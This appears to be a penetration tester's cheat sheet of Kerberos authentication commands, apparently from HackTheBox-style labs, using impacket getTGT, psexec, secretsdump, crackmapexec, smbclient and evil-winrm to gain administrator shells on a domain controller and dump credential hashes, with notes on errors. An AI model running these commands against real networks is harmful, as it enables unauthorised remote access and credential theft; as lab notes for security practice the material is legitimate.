##  kerberosAuth
```shell
# full domain name
impacket-getTGT -dc-ip 172.16.58.144 aaa.bbb.ccc/administrator

export KRB5CCNAME=administrator.ccache

# DC computername + full domain name
impacket-psexec administrator@WIN-G8TOCIEGCFG.aaa.bbb.ccc -k  -no-pass

# kerberos from cache file (TGS)
crackmapexec smb aaa.bbb.ccc --use-kcache

# kerberos authentication ( TGT + TGS )
crackmapexec smb aaa.bbb.ccc -k -u 'administrator' -p 'password'

impacket-smbclient -k -no-pass -dc-ip aaa.bbb.ccc administrator@WIN-G8TOCIEGCFG.aaa.bbb.ccc
impacket-smbclient -k  -dc-ip 172.16.58.144 "aaa.bbb.ccc/administrator"@WIN-G8TOCIEGCFG.aaa.bbb.ccc
smbclient -k -L \\WIN-G8TOCIEGCFG.aaa.bbb.ccc
evil-winrm -r aaa.bbb.ccc -i WIN-G8TOCIEGCFG.aaa.bbb.ccc
```
```shell
export KRB5CCNAME=ticket.ccache
impacket-psexec administrator@dc.sequel.htb -k -no-pass     (must specify FQDN)
impacket-secretsdump dc.sequel.htb -k  (must specify FQDN)
```
* error:
1. ~~impacket-psexec administrator@sequel.htb -k -no-pass~~:[-] SMB SessionError: STATUS_MORE_PROCESSING_REQUIRED({Still Busy} The specified I/O request packet (IRP) cannot be disposed of because the I/O operation is not complete.)
2. ~~impacket-psexec administrator@10.10.11.202 -k~~:[-] Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)


```shell
# krb5-user packge
kinit <username>
klist
kdestroy
```